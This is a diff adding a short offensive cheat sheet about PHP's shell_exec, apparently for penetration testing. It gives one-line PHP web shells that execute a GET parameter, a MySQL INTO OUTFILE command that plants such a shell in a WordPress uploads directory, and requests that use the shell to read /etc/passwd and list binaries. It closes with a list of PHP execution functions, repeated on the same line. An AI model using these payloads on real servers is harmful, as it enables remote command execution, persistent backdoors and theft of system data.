@@ -1,0 +1,37 @@
+shell_exec
+===========
+(PHP 4, PHP 5, PHP 7)
+
+shell_exec — Execute command via shell and return the complete output as a string
+
+Description
+===========
+
+string shell_exec ( string $cmd )
+
+
+INTO PHP FILE
+==============
+<?php echo system($_GET["cmd"]);?>
+
+#Alternative
+<?php echo shell_exec($_GET["cmd"]);?>
+
+
+ON MYSQL
+========
+
+mysql> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
+
+USE SHELL.PHP
+=============
+
+shell.php?cmd=cat+/etc/passwd
+
+shell.php?cmd=ls+/usr/bin
+
+PHP FUNCTION
+============
+
+system, eval, shell_exec, passthru, popen, proc_open, escapeshellarg, escapeshellcmd, exec, proc_close, proc_get_status, proc_nice, proc_terminate, pcntl_exec	system, eval, shell_exec, passthru, popen, proc_open, escapeshellarg, escapeshellcmd, exec, proc_close, proc_get_status, proc_nice, proc_terminate, pcntl_exec
+
